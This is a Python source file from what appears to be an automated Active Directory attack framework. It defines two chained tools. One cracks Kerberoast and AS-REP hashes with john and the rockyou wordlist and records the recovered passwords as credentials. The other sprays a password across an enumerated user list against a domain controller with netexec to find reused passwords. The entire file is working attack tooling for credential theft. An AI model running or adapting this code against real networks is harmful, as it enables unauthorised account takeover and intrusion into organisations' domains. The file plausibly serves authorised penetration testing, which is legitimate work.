# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Discrete built-in AD-chain step tools (the glue a flat tool sequence needs).

These let the AD kill chain run as a *sequence of built-in tools* driven by a
playbook (see the sequence runner) instead of one monolithic macro:

  * ``crack_hashes``  — crack Kerberos hashes (krb5tgs/krb5asrep) from a hashfile
    with john+rockyou and turn each cracked account into a credential variable.
  * ``spray_cracked`` — spray the current password across the user list to find
    reuse, adding each hit as a credential.

Both parse their tool output at the Autopwn level and stream every step, and both
feed the shared variables (username/password) that later tools auto-fill.
"""
from __future__ import annotations

import re
import subprocess
from pathlib import Path
from typing import Any

from .macro import MacroTool, Results
from .runner import which

# account embedded in a Kerberos hash line
_TGS_ACCT = re.compile(r"\$krb5tgs\$\d+\$\*([^*$]+)\*?\$")
_ASREP_ACCT = re.compile(r"\$krb5asrep\$\d+\$([^@:$]+)@")


def _rockyou() -> str | None:
    for p in ("/usr/share/wordlists/rockyou.txt",
              "/usr/share/wordlists/rockyou.txt.gz"):
        if Path(p).exists():
            if p.endswith(".gz"):
                out = "/tmp/rockyou.txt"
                if not Path(out).exists():
                    __import__("os").system(f"gunzip -c '{p}' > '{out}'")
                return out
            return p
    return None


class CrackHashesTool(MacroTool):
    name = "crack_hashes"
    category = "credentials"
    description = ("Crack Kerberos hashes (Kerberoast / AS-REP) from a hashfile with "
                   "john + rockyou and add each recovered account as a credential. "
                   "The hashfile variable is auto-filled from earlier roasting steps.")
    plan = [
        "Read the hashfile (krb5tgs / krb5asrep) produced by a roasting step",
        "Crack it offline with john + rockyou",
        "Map each cracked password to its account and add it as a credential",
    ]
    host_param = None
    parameters = {
        "type": "object",
        "properties": {
            "hashfile": {"type": "string", "description": "Path to the hashes to crack."},
            "domain": {"type": "string", "description": "AD domain (for labelling)."},
        },
        "required": [],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        hashfile = kw.get("hashfile") or self.get_var("hashfile")
        domain = kw.get("domain") or self.get_var("domain") or ""
        if not hashfile or not Path(hashfile).exists():
            self.log("no hashfile to crack (run a roasting step first)")
            return
        if which("john") is None:
            self.log("[!] john not installed")
            return
        wl = _rockyou()
        if not wl:
            self.log("[!] rockyou wordlist not found")
            return
        blob = Path(hashfile).read_text(errors="ignore")
        fmt = "krb5asrep" if "$krb5asrep$" in blob else "krb5tgs"
        self.log(f"[run] cracking {fmt} hashes with john + rockyou")
        try:
            subprocess.run(["john", f"--format={fmt}", f"--wordlist={wl}", hashfile],
                           capture_output=True, timeout=1800)
            show = subprocess.run(["john", "--show", f"--format={fmt}", hashfile],
                                  capture_output=True, text=True, timeout=120)
        except Exception as e:
            self.log(f"[!] crack error: {e}")
            return
        # The hashfile is written as "account:hash", so john --show prints
        # "account:password:…" — parse the account and the cracked password.
        for line in show.stdout.splitlines():
            line = line.strip()
            if not line or ":" not in line or "password hash" in line:
                continue
            if re.match(r"^\d+\s+password", line):        # john's summary line
                continue
            parts = line.split(":")
            user, pw = parts[0], (parts[1] if len(parts) > 1 else "")
            if user and pw and "$" not in user:
                self.add_cred(user, pw, domain, note="cracked")


class SprayCredTool(MacroTool):
    name = "spray_cracked"
    category = "credentials"
    description = ("Spray the current password across the enumerated user list to "
                   "find reuse. Uses the password + userlist variables (auto-filled "
                   "from earlier steps) and adds each valid account as a credential.")
    plan = [
        "Take the current password and user list (from earlier steps)",
        "Spray it across all users with --continue-on-success (no lockout)",
        "Add each account that accepts it as a credential",
    ]
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "DC/host to spray against."},
            "password": {"type": "string", "description": "Password to spray."},
            "userlist": {"type": "string", "description": "Path to the user list."},
            "domain": {"type": "string", "description": "AD domain."},
        },
        "required": ["target"],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        host = kw["target"]
        password = kw.get("password") or self.get_var("password")
        userlist = kw.get("userlist") or self.get_var("userlist")
        domain = kw.get("domain") or self.get_var("domain") or ""
        if not password or not userlist or not Path(userlist).exists():
            self.log("nothing to spray (need a password + user list)")
            return
        if which("nxc") is None:
            self.log("[!] netexec (nxc) not installed")
            return
        self.log(f"[run] spraying '{password}' across the user list on {host}")
        from ..chains import _valid_hits
        lf = Path(userlist).with_name("_reuse.log")
        try:
            subprocess.run(["nxc", "smb", host, "-u", userlist, "-p", password,
                            "--continue-on-success"], stdout=open(lf, "w"),
                           stderr=subprocess.STDOUT, timeout=1200)
        except Exception as e:
            self.log(f"[!] spray error: {e}")
            return
        for dom, user, pw in _valid_hits(lf.read_text(errors="ignore")):
            if user.lower() != "guest":
                self.add_cred(user, password, dom or domain, note="reuse")
